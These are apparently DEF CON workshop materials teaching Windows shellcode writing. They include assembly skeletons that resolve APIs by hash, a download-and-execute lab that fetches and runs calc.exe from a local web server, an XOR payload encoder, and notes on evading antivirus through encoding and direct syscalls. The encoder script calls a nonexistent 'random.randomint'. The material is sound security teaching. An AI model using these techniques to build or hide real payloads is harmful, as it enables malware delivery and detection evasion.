---
title: "Creating Shellcode for Hackers"
speakers: ["Bramwell 'Bw3ll' Brizendine"]
conference: "DEF CON"
conference_full: "DEF CON 34"
year: 2026
source_type: "workshop-materials"
source_dir: "DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers"
files_included: 14
files_skipped: 19
text_chars: 39954
redacted_secrets: 0
sha256: "d33d6edfa9f2e4b805b10047fa47846394876d613eca14d8d8d9793f9480fbc0"
converted_at: "2026-08-12T07:17:47Z"
---

# Creating Shellcode for Hackers

**Speakers:** Bramwell 'Bw3ll' Brizendine  
**Conference:** DEF CON 34 (workshop materials)  
**Contents:** 14 readable files inlined below. This is the workshop's own source material, not slide text — no OCR is involved, so the code is exact.

## Files not inlined

Binaries and oversized artefacts, listed for completeness:

- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Creating Shellcode for Hackers welcome letter.pdf` — 184 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Introduction/DEFCON_34_Assembly_Review - longer slide _ notes.pdf` — 3268 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Creating Multi-WinAPI Shellcode Lab.pdf` — 85 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Encoder Lab.pdf` — 67 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Lecture Notes - Creating Multi-WinAPI Shellcode.pdf` — 69 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Lecture Notes - Using Encoders.pdf` — 40 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/ShellcodeHarness.exe` — 26 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/ShellcodeHarness.pdb` — 1036 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Note to Students.docx` — 12 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/Lecture Notes - Rolling Your Own Shellcode.pdf` — 80 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/Rolling Your Own Shellcode Lab Guide.pdf` — 57 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/ShellcodeHarness.exe` — 26 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/ShellcodeHarness.pdb` — 1036 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/nasm_demo.pdf` — 180 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/ShellWasp/Additional Notes - Windows Syscalls and WoW64.pdf` — 95 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/ShellWasp/Lab Guide - Shellcode with Windows syscalls.pdf` — 548 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Slides/DEF CON 2026 workshop - final slides.pdf` — 10361 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Solutions and Walkthroughs/Solutions_and_Walkthroughs.zip` — 817 KB (binary)
- `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Solutions and Walkthroughs/nasm_demo.pdf` — 180 KB (binary)

## Materials

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Creating Multi-WinAPI Shellcode Lab.md`

````markdown
## Lab
We are now going to build upon everything we've learned so far and transform our simple shellcode into a more complex, multi-Win API calling shellcode.

For this lab we are going to walk through setting up shellcode that will download a file, write it to disk, and then create a process from it. We will be using `URLDownloadToFileA` and `CreateProcessA`.

### URLDownloadToFile

[Link to Docs](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85))

The first step will be modifying your shellcode to use `URLDownloadToFileA`. This will require two steps:

1. Loading the urlmon.dll library into the process
2. Dynamically resolving the function

Once you have loaded the module and resolved the function you need to setup the call to `URLDownloadToFileA`. You will need a URL and a file name; the rest of the parameters can be 0 in this case.

To simulate a web server, we will use python's built-in webserver:

```bash

python -m http.server 8080

```

Whatever working directory you run this from, copy calc.exe from C:\\Windows\\System32\\calc.exe to this directory so it can be served by the python web server.

The URL that you will need to include in the shellcode is `http://127.0.0.1:8080/calc.exe`. This will be one of the parameters. The second parameter will be the location it's downloaded to. The directory structure must already exist, so we'll use one that we know exists, `C:\\Windows\\Temp\\`. We'll download the file as `boom.exe` to differentiate it from our `calc.exe`. Using this information, create the call to URLDownloadToFileA in your shellcode.

### CreateProcessA

[Link to Docs](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

Now we will need to create the process from the file we downloaded. Remember, the file should be located in C:\\Windows\\Temp\\boom.exe.

There are many ways to setup the call to CreateProcessA, this lab will only walk you through one of them. First, we want to re-use the string for the file name as the first argument to `CreateProcessA`. We will leave the second argument NULL, as `CreateProcessA` can handle that and it's much easier for us to push a 0 on the stack than a string.

The third and fourth arguments will also be 0, followed by the fifth argument which is False. Since we are writing shellcode, there is no False so once again we will use 0 for bInheritHandles.

We will also specify 0 for the dwCreationFlag as this provides good defaults for us and ease-of-use.

Similarly, we will provide 0 for the environment pointer and the current directory pointer.

Unfortunately, that's where the ease of pushing 0s on the stack ends. We now need to create two Windows structures, `STARTUPINFO` and `PROCESS_INFORMATION`. These can be looked up from the docs link above. The good news is, while these structures are daunting for writing shellcode, only one field in both structures needs to be set and that is the `STARTUPINFO.cb` member needs to be set to the size of the `STARTUPINFO` struct.

- [STARTUPINFO](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
- [PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)

Look up these structures on MSDN and use that information plus what you know so far to push pointers to these objects on the stack for the call to `CreateProcessA`.

**HINT**: The objects can live in our shellcode, maybe we can use labels like we do with function pointer addresses to load the address into a register we can push onto the stack?

### Wrapping Up

Once you have managed to get our shellcode to work, demo it to the instructors by setting up your python server, copying calc to the correct directory, executing the shellcode in the handler, and showing that boom.exe (calc.exe) begins execution!
````

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Encoder Lab.md`

```markdown
## Encoding Your Shellcode
### Assembly Side
For the next part of this lab, you will be creating an encoder to encode your shellcode. Much of this has been done for you, but parts you will need to fill in.

1. Open the xor_decode_skeleton.asm. The first thing you will notice is a lot of control-flow redirection. This is to avoid null-bytes.
2. Review the decoder stub to understand how it works. 
3. In which register does the address of encoded shellcode end up in?  
4. In which register does the size of the encoded shellcode end up in? 
5. Which instruction is doing the decoding? 

Compile the xor_decode_skeleton.asm using NASM.  

## The Python Encoder

We have provdied the XOREncode.py script for encoding. We will go over it in detail during the walkthrough, but python experience is not a pre-requisite of this course so we will use it as a tool for now.

Encode your shellcode: `python XOREncode.py <file>.bin`.

**Note**: Make sure you're not encoding your `.asm` file. This will not work when you attempt to run it using the ShellcodeHarness.

### Ready To Go?
You should now have all the parts you need to run your encoded payload! Encode your payload and run it using the ShellcodeHarness and make sure it still works.

Remember, you can debug the ShellcodeHarness.exe and step through your shellcode execution. Watch the shellcode decode each byte as it runs and jump to your final payload. You can do this with the Multi-Win API shellcode or your original ExitProcess shellcode.
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Lecture Notes - Creating Multi-WinAPI Shellcode.md`

```markdown
# Creating Multi-WinAPI Shellcode
## Looking up Windows APIs and Structures

The Windows API is notoriously large and complex. It's very unlikely anyone will memorize or learn the entire API, which is likely why Microsoft publishes all of the docs on MSDN. You can search on MSDN for the function you are looking for and see a large amount of information about the functions, structures, and often even a usage example of how to correctly use the call.

Let's walk through an example to illustrate the point. We'll look at the `CreateFileW`. When we first go to [MSDN](https://learn.microsoft.com/en-us/), we can search for our function that we want to learn about. We'll search for `CreateFileW` and navigate to the page with information about the function, [here](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew).

We can immediately see a summary of the function, it's purpose, what it does, and even the syntax for the function definition. If we continue scrolling down, we can learn more about each parameter, default values, and what kind of information is expected for each parameter.

For example, we can see that dwDesiredAccess and dwShareMode require specific values from definitions within the operating system. We can navigate to any of those pages to learn more about "Generic Access Rights". We can also see a short list of possible values for dwShareMode based on how we want the file to be shared that we are creating.

Not all parameters are required, which can be very nice while writing shellcode as it means a `PUSH 0x0` instead of setting up a complex structure. The lpSecurityAttributes are an optional parameter and if we aren't worried about them for our file, then we can just skip it and use 0 instead.

Finally, we scroll down to the return value. This can give us more information about what's expected from a successful and unsuccessful call to this function. `CreateFileW` returns a handle to the opened file. This handle "represents" the file to the operating system but is not the file itself. Other Windows APIs will take this handle and perform actions on the file only with that handle as opposed to the file name, the full path name, etc.

CreateFileW is unique in these docs as the "Remarks" section has lots of additional content to understand what is going on with files. `CreateFileW` is a very complex call and can handle many resources, paths, and types of files. Any developer could be accessing any of those resources and could look at this page to better understand how `CreateFileW` handles those cases. While it's not always necessary to read everything on these pages, these sections and ultimately these docs, are excellent resources for learning more about Windows internals.

Lastly, if you ever need it, there are examples towards the bottom of the docs. Not every function always has examples, but `CreateFileW` does and many other do as well.

Moving on, let's look at a structure, `PROCESS_INFORMATION`, [here](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).

This structure will be used in an upcoming lab and we can see that Microsoft documents this structure for us as well. It contains the syntax for the struct, the data types, and names, and even pointer aliases for the structure.

Each of the members of the structure are summarized on the page. Lastly, we can see in the "Remarks" section a good tip. Make sure to clean up handles when you are done using them. It is reassuring the system will eventually clean them all up, but not until the parent process is terminated, per the documentation. This can be useful information for resource management on the operating system; these details can sometimes be the difference on being caught by AV/EDR or not!
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/Lecture Notes - Using Encoders.md`

```markdown
### Using encoders

Lastly, we come to encoders. This is the more progammatic way to solve the issue. What if we had a stub of code that could just decode all of our code? We could give it a key and that key would allow the encoder to do all of the decoding in memory. We wouldn't need to manually compute values or instructions, we simply write our code and then encoded it and prepend a stub that decodes it to the shellcode.

Encoders can be a little tricky as they are often targeted by Antivirus companies because they themselves cannot be encoded. This means they are a prime target for signature based detection.

One of the most famous encoders when first learning about shellcode is the shikata ga nai encoder included in Metasploit. This is polymorphic XOR additive feedback encoder. In other words, it uses XOR and addition of values to compute the key which feeds into the decoding process. This makes it difficult to decrypt with a static key but once the algorithm is known by an analyst it can be trivially decoded.

For this course, we'll do a simple XOR encoder to demonstrate the technique. The idea is that every byte in the payload will be XOR encoded with a specific value. This will obfuscate the bytes and potentially eliminate any null bytes. However, there is a chance that the byte used as the key is present in the shellcode and thus would make a new null byte. This problem can be solved with multiple encodings or selecting a key that is not used anywhere in the shellcode.
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/WinAPIHash.py`

```python
import sys
import argparse

def _rol_32bits(val, bits):
    return (((val << bits) & 0xFFFFFFFF) | ((val >> (32-bits)) & 0xFFFFFFFF)) & 0xFFFFFFFF  # Simulate rol 7 while staying in 32bits

def hash(name):
    hash_value = 0
    for c in name:
        hash_value = _rol_32bits(hash_value, 7)  # Simulate rol 7 while staying in 32bits
        hash_value = (hash_value ^ (c & 0xFF)) & 0xFFFFFFFF  # Simulate XOR single byte with hash value and staying within 32bits
    return hash_value & 0xFFFFFFFF

def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-s", "--string", default="virtualalloc", help="Specify the string to hash. Modules should be lowercase and function names should match exactly.")
    args = arg_parser.parse_args()
    windows_api_string = args.string.encode()
    print(windows_api_string)
    print(f"0x{hash(windows_api_string):x}\n")

if __name__ == "__main__":
    main()
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/XOREncode.py`

```python
import sys
import random

# These are the same bytes we get by compiling the xor_decode_skeleton.asm. This will decode our
# shellcode payload and jump to it.
XOR_DECODER_STUB = bytes([
    0xEB, 0x03, 0x5A, 0xEB, 0x05, 0xE8, 0xF8, 0xFF, 0xFF, 0xFF, 0x30, 0xD2, 0xEB, 0x1B, 0x5B, 0x31, 
    0xC9, 0xB9, 0xCC, 0xDD, 0xEE, 0xFF, 0x81, 0xF1, 0xDD, 0xCC, 0xBB, 0xAA, 0x31, 0xC0, 0x80, 0x33, 
    0xAA, 0x43, 0x40, 0x39, 0xC8, 0x7C, 0xF7, 0xEB, 0x05, 0xE8, 0xE0, 0xFF, 0xFF, 0xFF
])

def main():

    # First, we want to take the first argument, which will be
    # a path to the shellcode, and read in the binary data
    with open(sys.argv[1], "rb") as f:
        data = f.read()

    # Next we want to find the first least byte that is not
    # used in the shellcode and use that as our key.
    # This works because creating a set from the data
    # list deduplicates all bytes and we get a unique list
    # of the bytes that are used. If there are less than
    # 256 unique bytes, at least one was not used.
    data_set = set(data)
    if len(data_set) < 256:
        while True:
            key = random.randint(0,255)
            if key not in data_set:
                break
    else:
        print("[!] All bytes are used, this encoding cannot be null-free.")
        key = random.randomint(0,255)
    
    print(f"Key selected: 0x{key:x}\n")
    
    # Now we want to encode all the bytes.
    encoded_data = []
    for b in data:
        # This is the actual encoding that happens with our single-byte key
        # The `^` operator in python is for XOR
        encoded_data.append(b^key)

    print(f"Encoded Data (size: {len(encoded_data)}):")
    print(f"{bytes(encoded_data)}\n")

    # Remember, the size needs to be XORd with a DWORD key
    # that is null free and then placed in the XOR_DECODER_STUB
    encoded_data_size = len(encoded_data)
    while True:
        size_key = random.randint(0, 2**32-1) 
        size_constant = size_key ^ encoded_data_size
        size_constant_bytes = size_constant.to_bytes(4, 'little')
        if 0 not in size_constant_bytes:
            break
    print(f"Size Key: 0x{size_key:x}")
    print(f"Size Key Bytes: {size_key.to_bytes(4,'little')}")
    print(f"Size Constant: 0x{size_constant:x}")
    print(f"Size Constant Bytes: {size_constant_bytes}\n")

    # Now we begin the process of replacing the defaults in the XOR decoder stub with our computed values.
    # First: We need to replace the 0xFFEEDDCC values with our `size_constant_bytes`
    size_constant_instruction = b'\xb9'+size_constant_bytes
    modified_xor_decoder_stub = XOR_DECODER_STUB.replace(b'\xb9\xcc\xdd\xee\xff', size_constant_instruction)

    # Next, we need to replace 0xAABBCCDD with our `size_key`. Remember: size_key XOR size_constant_bytes
    # is equal to our actual shellcode size that we need for decoding.
    size_xor_instruction = b'\x81\xf1'+size_key.to_bytes(4, 'little')
    modified_xor_decoder_stub = modified_xor_decoder_stub.replace(b'\x81\xf1\xdd\xcc\xbb\xaa', size_xor_instruction)

    # Finally, we change the XOR key for the decoder. This replaces the default, 0xaa with the key we
    # selected to make the encoded payload null-free.
    xor_decoding_instruction = b'\x80\x33' + key.to_bytes(1, 'little')
    modified_xor_decoder_stub = modified_xor_decoder_stub.replace(b'\x80\x33\xaa', xor_decoding_instruction)

    print("Compare XOR Decoder Stubs:")
    print(f"Before: {XOR_DECODER_STUB!r}\nAfter: {modified_xor_decoder_stub!r}\n")

    # The last step is to combine our modified decoder stub with our computed values
    # with the actual encoded data at the end of the stub. This is our full payload!
    final_shellcode = modified_xor_decoder_stub + bytes(encoded_data)
    print(f"Final Shellcode (size: {len(final_shellcode)}):")
    print(f"{final_shellcode}\n")

    with open("xor_encoded_shellcode.bin","w+b") as f:
        f.write(final_shellcode)


if __name__ == "__main__":
    main()
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Multi-WinAPI_Shellcode_And_Encoder/multiwinapi_skeleton.asm`

```asm
[BITS 32]

mainentrypoint:

call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction?

push edx
mov ebx, 0x4b1ffe8e  ; kernel32.dll module hash
call get_module_address
pop edx

push ebp
push edx
mov ebp, eax

lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Load urlmon.dll into process 
; TODO
; You will need to make a call to LoadLibraryA to load the urlmon.dll into the process

; In order to push strings onto stack, load the address into a register
; and then push it onto the stack, e.g.
; lea ecx, [EDX + urlmon_dll]
; push ecx

; Resolve all functions needed in urlmon.dll
; TODO
; Now you can use the get_module_address and get_api_address functions to resolve the functions in urlmon.dll

; Call URLDownloadToFileA
; URLDownloadToFileA (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
; TODO

; Call CreateProcessA
; Use the lab guide to figure out how to call CreateProcessA and implement that information here
; TODO

; Exit process
; call ExitProcess API
push 0x00
push dword [EDX + ExitProcess]
pop eax 
call eax

; END OF SHELLCODE IMPLEMENTATION

; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0x???????? ; CreateProcessA
	dd 0x???????? ; ExitProcess
	dd 0x???????? ; LoadLibraryA
	dd 0xFFFF ; make sure to end with this token

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
    dd 0x00000002
ExitProcess:
    dd 0x00000003
LoadLibraryA:
	dd 0x00000001

URLMONHASHTABLE:
	dd 0x???????? ; URLDownloadToFileA
	dd 0xFFFF ; make sure to end with this token

URLMONFUNCTIONSTABLE:
URLDownloadToFileA:
	dd 0x00000011
urldata:
; File extension in URL DOES matter 
; Extensions .txt and .htm (and possibly more) dont get saved to disk by URLDownloadToFile causing shellcode to fail
; Make sure to run the python webserver `python -m http.server 8080` with a calc.exe copy in that current working directory

db "http://127.0.0.1:8080/calc.exe", 0
filename:
db "C:\\Windows\\Temp\\boom.exe", 0
urlmon_dll:
db "urlmon.dll", 0

startupinfo_struct:
dd 0x???????? ; size of startup info struct
dd 0x00000000
...
dd 0x00000000

process_information_struct:
;TODO process information structure goes here
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/Lecture Notes - Rolling Your Own Shellcode.md`

````markdown
# Rolling Your Own Shellcode
## Removing bad characters
### Substituting instructions

One of the most common substitutions is for setting values equal to zero. You can absolutely use `MOV EAX, 0x0` and this will assign the EAX register to be zero. However, this will contain at least one null byte because of the constant 0x0 being present in the instruction.

A common trick to avoid this is to XOR a register with itself, `XOR EAX, EAX`. Any value XOR'd with itself is 0; the XOR operation just has this mathematical property.

It natually follows from this that any small value that you need can be created by XOR-ing a register and then incrementing the register until you get the value you need. However, at some point, there is a tradeoff between the number of `INC` calls you need and the actual value you need.

Again, for small values, you can use `LEA` as another tactic. `LEA` stands for Load Effective Address. It has some weird usage, but any single byte value can be used like the following to get a byte into a register.

```asm
XOR EAX, EAX
LEA EAX, [EAX+0x45]
```

This will place the byte 0x45 into the EAX register. This works because we zero out the EAX register and then we add 0x45 to EAX, which is zero, to create an "address" of 0x45. We then move that value into EAX for storage.

This leads into our next subsection, arithmetic construction of values.

### Arithmetic construction

Building on our previous example, we can repeat that LEA technique to fill in a register using `LEA` and the `SHL` instruction. The `SHL` instruction shifts a value to the left by the number of bits specified as an argument. Given that each DWORD is 32bits, and each byte takes up 8 bits. We can create any DWORD following this trick.

```asm
XOR EAX, EAX
LEA EAX, [EAX+0x12]
SHL EAX, 8
LEA EAX, [EAX+0x34]
SHL EAX, 8
LEA EAX, [EAX+0x56]
SHL EAX, 8
LEA EAX, [EAX+0x78]
```

This will place the value, 0x12345678 into EAX with no null bytes.

We can also use AND, OR, NOT, NEG, and XOR to create values in any register without using null bytes. We can also use math operations like ADD, SUB, MUL, and DIV to get us the numbers we need too. This requires a bit of pre-computation before putting the values in your shellcode, but once you have them the operation will run correctly and produce your value. Let's say we need a value that has a null byte in it, we can use math to create it.

Let's create 'cmd.exe\0' using math. Unfortunately we can see that this will require a null byte. Since those are not allowed for this example, we need a way to compute it instead of passing it in.

'cmd.' is 0x63 0x6d 0x64 0x2e in hexadecimal and in little endian we get the hex constant 0x2e646d63. Let's use XOR to compute this. We can get 0xFFFFFFFF from `XOR EAX, EAX` followed by a `DEC EAX`. Then we can use a constant, 0xd19b929c, which also has no null bytes. When we XOR -1 and our new constant, we get our desired hex value.

Now we need our hex constant that has a null value, 0x00657865. We can take advantage of knowing that the opposite (or NEG) of 0x00 is 0xFF. We can then use 0xFF9A879A, which is null free, and call the NEG instruction on the register that holds it to compute our value.

Lastly, we will want these values on the stack so we can use the string as an argument to a function call. An example might look something like this:

```asm
MOV EAX, 0xFF9A879A
NEG EAX
PUSH EAX
XOR EAX, EAX
DEC EAX
XOR EAX, 0xd19b929c
PUSH EAX
```

The possibilities to compute values are unlimited and rely only on your creativity and the restricted characters for your shellcode.
````

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/Rolling Your Own Shellcode Lab Guide.md`

```markdown
## Write a ExitProcess Shellcode

### Step 1
Review the skeleton.asm and look for places that need to be filled in. You will need to fill in a module hash, a function hash, and the actual instructions to call the resolved function with the correct argument.
### Step 2
Use the WinAPIHash.py script from before to calculate your hashes. Remember, modules must be lowercase but functions should match exactly.

You will need to compute:
- "kernel32.dll"
- "ExitProcess"
### Step 3
Once you have computed the hashes and wrote them in your assembly, you will need to actually make the call to ExitProcess. First, you will need the exit code, 0, as an argument to that function. Implement that instruction first. Then use the KERNEL32_EXITPROCESS label to load the function address into a register to call.

Once you believe you have it, run your shellcode in the debugger with ShellcodeHarness.exe.

The hard part about calling ExitProcess is that even when the process crashes, the process exits. We want to make sure you get to the ExitProcess function call, and call it successfully. Use your debugger with the ShellcodeHarness.exe and set a breakpoint at `ExitProcess` to verify it works successfully.
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/WinAPIHash.py`

```python
import sys
import argparse

def _rol_32bits(val, bits):
    return (((val << bits) & 0xFFFFFFFF) | ((val >> (32-bits)) & 0xFFFFFFFF)) & 0xFFFFFFFF  # Simulate rol 7 while staying in 32bits

def hash(name):
    hash_value = 0
    for c in name:
        hash_value = _rol_32bits(hash_value, 7)  # Simulate rol 7 while staying in 32bits
        hash_value = (hash_value ^ (c & 0xFF)) & 0xFFFFFFFF  # Simulate XOR single byte with hash value and staying within 32bits
    return hash_value & 0xFFFFFFFF

def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-s", "--string", default="virtualalloc", help="Specify the string to hash. Modules should be lowercase and function names should match exactly.")
    args = arg_parser.parse_args()
    windows_api_string = args.string.encode()
    print(windows_api_string)
    print(f"0x{hash(windows_api_string):x}\n")

if __name__ == "__main__":
    main()
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/Rolling_Your_Own_Shellcode/skeleton.asm`

```asm
[BITS 32]

mainentrypoint:

call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction?

push edx
mov ebx, 0x????????  ; kernel32.dll module hash
call get_module_address
pop edx

push ebp
push edx
mov ebp, eax

lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; call ExitProcess API
; TODO - STUDENT IMPLEMENTATION GOES HERE

; END OF SHELLCODE IMPLEMENTATION

; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0x????????  ; ExitProcess
	dd 0xFFFF ; make sure to end with this token

KERNEL32FUNCTIONSTABLE:
KERNEL32_EXITPROCESS	dd 0x00000000
```

### `DEF CON 34 - Workshops - Bramwell - Bw3ll - Brizendine - Creating Shellcode for Hackers/ShellWasp/Additional Notes - Windows Syscalls and WoW64.md`

````markdown
## Background

In general, most guidance you will read about using Windows system calls is that you shouldn't. There is a strong reason for that, and that's because Microsoft makes no guarantees that these system call numbers, or System Service Numbers (SSNs) will not change between versions. Instead, Microsoft exposes high level wrappers, like what most developers use and what we've been dynamically resolving in our shellcode, to make sure backwards compatibility is not compromised.

This is great from a building project perspective as developers can be sure that their `CreateFile` function will never change and they can use it across versions. There is no such guarantee about `NtCreateFile`. `NtCreateFile` is the exposed API by ntdll.dll that explicitly calls the correct SSN and causes the switch from user to kernel-mode.

This technique goes even one step further and actually loads the arguments in the correct registers or on the stack and calls the SSN itself by placing it into the EAX register and calling the `SYSCALL/SYSENTER` (or `INT 0x2E`) instruction.

Now as we've established, this is less than stellar for backwards compatibility but, one of the biggest hinderances for running shellcode is the presence of Anti-Virus. AV will use all sorts of detection mechanisms and hooks in the code to attempt to catch and block your code. By calling the SSN yourself, you guarantee that at no point between the `CreateFile` and `NtCreateFile` was a hook used to capture what you are doing. The reason we can be sure is that you didn't call any of those wrappers in your shellcode and therefore no hook was ever triggered either.

In addition, this technique bypasses the need for resolving functions and libraries because the code is implemented in your shellcode. However, the trade-off here is that a lot of upfront work was needed to make sure you have all the calls, arguments, and parameters setup correctly before you made that call. In some cases that upfront work is an excellent trade-off for secrecy and effectiveness.

For this course, we look at what these code snippets look like and how we can implement them. We will also look at SSN resolving using ShellWasp to speed up the development process.

## Nt* Function Example

